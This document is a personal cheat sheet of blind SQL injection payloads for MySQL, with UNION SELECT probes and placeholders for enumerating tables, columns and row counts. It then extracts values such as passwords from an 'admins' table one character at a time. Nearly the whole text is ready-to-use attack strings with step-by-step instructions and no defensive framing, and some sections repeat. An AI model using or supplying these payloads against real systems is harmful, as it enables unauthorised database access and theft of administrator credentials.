*** Testing Query ****
  ' UNION SELECT 1, #, #... WHERE ascii(SUBSTRING('A', 1, 1)) = 65-- -


- Dumping the LENGHT of a table name:
' UNION SELECT 1 WHERE (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1) = {LENGHT}-- -


- Dumping the TABLE NAME character by character:
' UNION SELECT 1 WHERE ascii(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {position}, 1)) = {ascii_value}-- -

{index} — Refers to the index of the table (0 = first, 1 = second, etc.).
{position} — Extracts a specific character of the table name.
{ascii_value} — The ASCII value of the target character.


- Dumping COLUMN LENGHTS:
' UNION SELECT 1 WHERE (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table_name}' LIMIT {position},1) = {NUMBER}-- -
{table_name}: The table name you are targeting.
{position} — Extracts a specific character of the table name. starts at 1
{number} - lenght of the column name, just keep iterating until the statement is True.

- Dumping COLUMN NAMES character by character:
** If you keep getting 0 as the first valid ASCII value everytime, keep increasing your index position, it's weird, but you need to increase it until you reach the right offset.
' UNION SELECT 1 WHERE ascii(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table_name}' LIMIT {index},1), {position}, 1)) = {ascii_value}-- -
{table_name}: The table name you are targeting.
{index}: The index of the column (0 = first column, 1 = second column, etc.).
{position}: The position of the character in the column name (1 = first character, 2 = second character, etc.).
{ascii_value}: The ASCII value of the character you are trying to guess.


- Dump the number of rows in a table:
' UNION SELECT 1 WHERE (SELECT COUNT(*) FROM {table_name}) = {row_count}-- -



- 2. Dump the Length of the Column Value for a Specific Row:
For row {row_index}, determine the length of the value in {column_name}:
' UNION SELECT 1 WHERE (SELECT LENGTH({column_name}) FROM admins LIMIT {row_index},1) = {length}-- -
Replace {column_name} with the column name you want to target (e.g., password).
Replace {row_index} with the index of the row (0 for the first row, 1 for the second, etc.).
Replace {length} with the length you want to test.





- 1. Determine the Number of Rows:
' UNION SELECT 1 WHERE (SELECT COUNT(*) FROM admins) = {row_count}-- -
Replace {row_count} with the number of rows you are testing.


- 2. Dump the Length of the Column Value for a Specific Row:
For row {row_index}, determine the length of the value in {column_name}:

' UNION SELECT 1 WHERE (SELECT LENGTH({column_name}) FROM admins LIMIT {row_index},1) = {length}-- -
Replace {column_name} with the column name you want to target (e.g., password).
Replace {row_index} with the index of the row (0 for the first row, 1 for the second, etc.).
Replace {length} with the length you want to test.

- 3. Dump the Column Value Character by Character:
To extract the value of {column_name} for row {row_index}, one character at a time:


' UNION SELECT 1 WHERE ascii(SUBSTRING((SELECT {column_name} FROM admins LIMIT {row_index},1), {position}, 1)) = {ascii_value}-- -
Replace {column_name} with the column name (e.g., password).
Replace {row_index} with the index of the row (e.g., 0 for the first row).
Replace {position} with the position of the character to extract (1 for the first character, 2 for the second, etc.).





